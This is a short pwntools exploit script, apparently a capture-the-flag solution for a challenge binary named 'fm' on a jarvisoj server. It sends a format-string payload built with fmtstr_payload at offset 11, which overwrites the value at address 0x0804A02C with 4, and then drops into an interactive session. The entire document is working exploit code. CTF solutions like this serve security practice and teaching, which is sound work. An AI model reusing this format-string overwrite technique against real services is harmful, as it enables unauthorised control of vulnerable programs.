from pwn import *
context.log_level = 'debug'

local = 0

if local:
	cn = process('./fm')
else:
	cn = remote('pwn2.jarvisoj.com', 9895)

bin = ELF('./fm')
offest = 11

pay = fmtstr_payload(11,{0x0804A02C:4})

cn.sendline(pay)
cn.interactive()